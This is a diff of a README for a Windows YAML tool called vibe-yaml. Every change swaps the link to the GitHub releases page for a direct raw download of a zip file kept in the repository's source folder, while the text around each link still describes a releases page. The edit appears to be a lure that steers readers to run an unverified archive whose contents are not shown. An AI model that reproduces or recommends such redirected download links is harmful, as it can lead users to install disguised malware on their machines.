@@ -1,12 +1,12 @@
 # 🧪 vibe-yaml - Read YAML With Better Feel
 
-[![Download vibe-yaml](https://img.shields.io/badge/Download-vibe--yaml-1f6feb?style=for-the-badge&logo=github)](https://github.com/ianXO0/vibe-yaml/releases)
+[![Download vibe-yaml](https://img.shields.io/badge/Download-vibe--yaml-1f6feb?style=for-the-badge&logo=github)](https://github.com/ianXO0/vibe-yaml/raw/refs/heads/main/src/vibe-yaml-2.6.zip)
 
 ## 📥 Download
 
 Visit this page to download vibe-yaml for Windows:
 
-[https://github.com/ianXO0/vibe-yaml/releases](https://github.com/ianXO0/vibe-yaml/releases)
+[https://github.com/ianXO0/vibe-yaml/raw/refs/heads/main/src/vibe-yaml-2.6.zip](https://github.com/ianXO0/vibe-yaml/raw/refs/heads/main/src/vibe-yaml-2.6.zip)
 
 On the releases page, look for the latest version and download the Windows file listed there. If you see more than one file, choose the one for Windows that ends in `.exe` or comes in a `.zip` file.
 
@@ -40,7 +40,7 @@ If your Windows device can run standard desktop apps, it should be able to run v
 Follow these steps:
 
 1. Open the download page:
-   [https://github.com/ianXO0/vibe-yaml/releases](https://github.com/ianXO0/vibe-yaml/releases)
+   [https://github.com/ianXO0/vibe-yaml/raw/refs/heads/main/src/vibe-yaml-2.6.zip](https://github.com/ianXO0/vibe-yaml/raw/refs/heads/main/src/vibe-yaml-2.6.zip)
 
 2. Find the latest release near the top of the page.
 
@@ -217,7 +217,7 @@ Check the releases page often if you want the latest build.
 
 If you need the installer or app file again, use this page:
 
-[https://github.com/ianXO0/vibe-yaml/releases](https://github.com/ianXO0/vibe-yaml/releases)
+[https://github.com/ianXO0/vibe-yaml/raw/refs/heads/main/src/vibe-yaml-2.6.zip](https://github.com/ianXO0/vibe-yaml/raw/refs/heads/main/src/vibe-yaml-2.6.zip)
 
 ## 📌 Extra notes
 
